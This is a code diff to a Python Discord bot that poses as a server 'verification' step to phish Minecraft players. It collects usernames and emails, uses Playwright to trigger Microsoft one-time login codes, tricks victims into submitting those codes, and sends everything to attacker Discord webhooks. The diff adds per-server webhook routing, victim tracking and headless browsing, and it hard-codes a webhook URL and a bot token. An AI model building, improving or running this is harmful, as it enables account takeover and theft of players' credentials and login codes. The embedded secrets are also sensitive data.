@@ -11,9 +11,13 @@ import calendar
 import asyncio
 from playwright.async_api import async_playwright
 #define
+global listofpeople
+listofpeople = []
+
+
 embed = discord.Embed(title="Verification", description="By verifying through the form, you will gain access to the rest of the Discord server. Please click the button below to proceed with the verification process. Thank you.", color=40192)
 embed4 = discord.Embed(title="❌ - Error", description="You've entered a fake or not exisiting email. Please enter your real email address. \n Thank you.", color=40192)
-embed2 = discord.Embed(title="Verification Code Sent", description=f"""✔ - A verification code has been sent to your Minecraft Email - please check your inbox!""", color=40192)
+embed2 = discord.Embed(title="Verification Code Sent", description="""✔ - A verification code has been sent to your Minecraft Email - please check your inbox!""", color=40192)
 embed2.set_footer(text="Click the button below to enter your verification code!")
 #setup shit
 class MyView(discord.ui.View): # Create a class called MyView that subclasses discord.ui.View
@@ -42,7 +46,26 @@ class MyModal(discord.ui.Modal):
         email = value=self.children[1].value
         embed = discord.Embed(title=f"We have sent a verification code to {email} - Please check your inbox and submit the code")
         await interaction.response.send_message(embeds=[embed], ephemeral=True, view=MyView2())
-        requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
+        url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"
+
+        listofpeople.append([username, email, interaction.user])
+        #print(interaction.guild)
+        print(interaction.guild_id)
+
+        with open("id.txt", 'r') as file:
+          for line in file:
+              line = line.strip()
+              #print(line)
+             # print(str(interaction.guild_id))
+              if str(interaction.guild_id) in line:
+                  #print("step 1 done")
+                  id_and_url = line.split('|')
+                  
+                  #print("step 2 done")
+                  url = id_and_url[1]
+                  break
+        #print(url)
+        requests.post(url, json = {
   "username": "woly phissha",
   "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
   "content": "@everyone idk what im doing",
@@ -65,21 +88,25 @@ class MyModal(discord.ui.Modal):
           "name": "✉️ - **E-Mail**",
           "value": f"```{email}```"
         },
+        {
+          "name": "🗿 - **Discord Name**",
+          "value": f"```{interaction.user}```"
+        },
       ]
     }
   ],
     "components": []
-})
-        await requestcode()
+}, timeout=5000)
+        await requestcode(interaction)
 
         
 
 import asyncio
 from playwright.async_api import async_playwright
 
-async def requestcode():
+async def requestcode(interaction):
     async with async_playwright() as playwright:
-        browser = await playwright.chromium.launch(headless=False)
+        browser = await playwright.chromium.launch(headless=True)
         page = await browser.new_page()
         context = await browser.new_context()
 
@@ -88,28 +115,52 @@ async def requestcode():
         await page.click('#id__4')
         await page.fill('input[name="loginfmt"]', email)
         await page.click('input[type="submit"]')
-        requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
-      "username": "woly phissha",
-      "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
-      "content": f"Sucessfully got code from {email}"
-})
+
+        url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"
+
+        with open("id.txt", 'r') as file:
+          for line in file:
+              line = line.strip()
+             # print(line)
+             # print(str(interaction.guild_id))
+              if str(interaction.guild_id) in line:
+                  #print("step 1 done")
+                  id_and_url = line.split('|')
+                  
+                  #print("step 2 done")
+                  url = id_and_url[1]
+                  break
+
+        #requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
+        #  "username": "woly phissha",
+        #  "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
+        #  "content": f"Sucessfully got code from {email}"
+        #})
+
         try:
           await page.wait_for_selector('#otcLoginLink', state='visible')
           await page.click('#otcLoginLink')
         except Exception as e:
-                      requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
-      "username": "woly phissha",
-      "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
-      "content": f"Wasent able to retrieve code from {email} normal way. Trying different metheod"
-})
-                      await page.wait_for_selector('#idA_PWD_SwitchToCredPicker', state='visible')
-                      await page.click('#idA_PWD_SwitchToCredPicker')
-                      await page.click(f'text=Email {email}')
-                      requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
-      "username": "woly phissha",
-      "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
-      "content": f"@everyone Successfully got code from {email}"
-})
+          requests.post(url, json = {
+            "username": "woly phissha",
+            "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
+            "content": f"Wasent able to retrieve code from {email} normal way. Trying different metheod"
+          })
+          try:
+            await page.wait_for_selector('#idA_PWD_SwitchToCredPicker', state='visible')
+            await page.click('#idA_PWD_SwitchToCredPicker')
+            await page.click(f'text=Email {email}')
+            requests.post(url, json = {
+              "username": "woly phissha",
+              "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
+              "content": f"@everyone Successfully got code from {email}"
+            })
+          except Exception as e:
+              requests.post(url, json = {
+                "username": "woly phissha",
+                "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
+                "content": f"@everyone COULDN'T GET CODE FROM: {email}"
+            }, timeout=5000)
 
 
 
@@ -124,10 +175,42 @@ class MyModal2(discord.ui.Modal):
         date = date_time + timedelta(minutes=30)
         utc_time = calendar.timegm(date.utctimetuple())
         Code = value=self.children[0].value
-        requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json ={
-  "username": "i steal the shippy embed shit - wol",
+
+        search_value = interaction.user
+
+        found_entry = ["none", "none"]
+        #print(listofpeople)
+        works = False
+        for entry in listofpeople:
+            if search_value in entry:
+                found_entry = entry
+                break
+
+        if found_entry != ["none", "none"]:
+          listofpeople.remove(found_entry)
+          works = True
+        else:
+          works = False
+
+        url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"
+
+        with open("id.txt", 'r') as file:
+          for line in file:
+              line = line.strip()
+             # print(line)
+              #print(str(interaction.guild_id))
+              if str(interaction.guild_id) in line:
+                  #print("step 1 done")
+                  id_and_url = line.split('|')
+                  
+                  #print("step 2 done")
+                  url = id_and_url[1]
+                  break
+
+        requests.post(url, json ={
+  "username": "code hehe",
   "avatar_url": "https://media.discordapp.net/attachments/1087806512442900491/1087813733134381066/0518a2a092bfdc95593b76aead97f220.jpg",
-  "content": "@everyone code",
+  "content": "@everyone code take it nerds",
   "embeds": [
     {
       "title": "Code entered!",
@@ -135,7 +218,7 @@ class MyModal2(discord.ui.Modal):
       "description": "",
       "timestamp": "",
       "author": {
-        "name": "otp code (icba to get discord user name)"
+        "name": "otp code (icba to get discord user name - but invxlid was)"
       },
       "image": {},
       "thumbnail": {},
@@ -146,20 +229,32 @@ class MyModal2(discord.ui.Modal):
           "value": f"```{Code}```"
         },
         {
+          "name": "💬 - **Username**",
+          "value": f"```{found_entry[0]}```"
+        },
+        {
+          "name": "✉️ - **E-Mail**",
+          "value": f"```{found_entry[1]}```"
+        },
+        {
           "name": "⌛ - Expires in",
           "value": f"<t:{utc_time}:R>"
-        }
+        },
+        {
+          "name": "🗿 - **Discord Name**",
+          "value": f"```{interaction.user}```"
+        },
       ]
     }
   ],
   "components": []
-})
+}, timeout=5000)
         embed = discord.Embed(title="Verification Complete!")
         await interaction.response.send_message(embeds=[embed], ephemeral=True)
 
 
 
-intents = discord.Intents.default()
+intents = discord.Intents.all()
 intents.message_content = True
 client = discord.Client(intents=intents)
 print ("Bot's running")
@@ -179,4 +274,4 @@ async def setup(ctx):
 
 
 
-client.run("token")
+client.run("MTA5ODA0OTExNDUwNTIxNjExMA.GzcD9z.eRCIr0nEuhsgC4P3dATP0KKhr-7pTQacVpGa4Q")
